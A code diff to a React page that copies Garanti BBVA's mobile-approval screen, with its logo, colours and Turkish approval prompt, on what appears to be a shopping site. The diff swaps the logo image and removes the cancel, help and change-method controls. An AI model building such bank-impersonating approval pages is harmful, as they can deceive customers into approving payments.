@@ -289,20 +289,17 @@ export default function GarantiMobilOnayPage() {
                         width: '74px',
                         height: '74px',
                         borderRadius: '16px',
-                        background: '#008542',
+                        overflow: 'hidden',
                         display: 'flex',
                         alignItems: 'center',
                         justifyContent: 'center',
                         boxShadow: '0 4px 12px rgba(0, 133, 66, 0.2)'
                     }}>
-                        {/* Center Clover Logo SVG */}
-                        <svg viewBox="0 0 100 100" fill="white" width="48" height="48">
-                            <path d="M50 48c-3-12-16-12-16 0 0 8 10 11 16 11s16-3 16-11c0-12-13-12-16 0z"/>
-                            <path d="M48 50c-12 3-12 16 0 16 8 0 11-10 11-16s-3-16-11-16c-12 0-12 13 0 16z"/>
-                            <path d="M50 52c3 12 16 12 16 0 0-8-10-11-16-11s-16 3-16 11c0 12 13 12 16 0z"/>
-                            <path d="M52 50c12-3 12-16 0-16-8 0-11 10-11 16s3 16 11 16c12 0 12-13 0-16z"/>
-                            <circle cx="50" cy="50" r="4" fill="#008542"/>
-                        </svg>
+                        <img 
+                            src="/garanti-clover.png" 
+                            alt="Garanti Clover" 
+                            style={{ width: '100%', height: '100%', objectFit: 'cover' }}
+                        />
                     </div>
 
                     {/* Instruction Text */}
@@ -313,68 +310,8 @@ export default function GarantiMobilOnayPage() {
                         lineHeight: '1.6',
                         padding: '0 8px'
                     }}>
-                        Lütfen <strong style={{ color: '#111' }}>{deviceModel}</strong> model telefonunuza gönderilen bildirimi Garanti BBVA Mobil uygulaması üzerinden onaylayın.
+                        Lütfen telefonunuza gönderilen bildirimi Garanti BBVA Mobil uygulaması üzerinden onaylayın.
                     </div>
-
-                    {/* Change Verification Method Link */}
-                    <button style={{
-                        background: 'none',
-                        border: 'none',
-                        color: '#008542',
-                        fontSize: '14px',
-                        fontWeight: '700',
-                        cursor: 'pointer',
-                        padding: '4px 8px'
-                    }}>
-                        Doğrulama Yöntemi Değiştir
-                    </button>
-                </div>
-
-                {/* Bottom Accordion Action Options */}
-                <div style={{
-                    display: 'flex',
-                    flexDirection: 'column',
-                    gap: '10px',
-                    width: '100%',
-                    marginTop: '4px'
-                }}>
-                    {/* Yardım Accordion */}
-                    <div style={{
-                        background: '#eef2f6',
-                        borderRadius: '8px',
-                        padding: '14px 16px',
-                        display: 'flex',
-                        justifyContent: 'space-between',
-                        alignItems: 'center',
-                        cursor: 'pointer',
-                        fontSize: '13px',
-                        fontWeight: '700',
-                        color: '#1e293b'
-                    }}>
-                        <span>Yardım</span>
-                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                            <polyline points="6 9 12 15 18 9" />
-                        </svg>
-                    </div>
-
-                    {/* İptal Et Button */}
-                    <button 
-                        onClick={() => router.push('/sepetim')}
-                        style={{
-                            width: '100%',
-                            background: '#eef2f6',
-                            border: 'none',
-                            borderRadius: '8px',
-                            padding: '14px',
-                            fontSize: '13px',
-                            fontWeight: '700',
-                            color: '#1e293b',
-                            textAlign: 'left',
-                            cursor: 'pointer'
-                        }}
-                    >
-                        İşlemi İptal Et
-                    </button>
                 </div>
             </div>
         </>
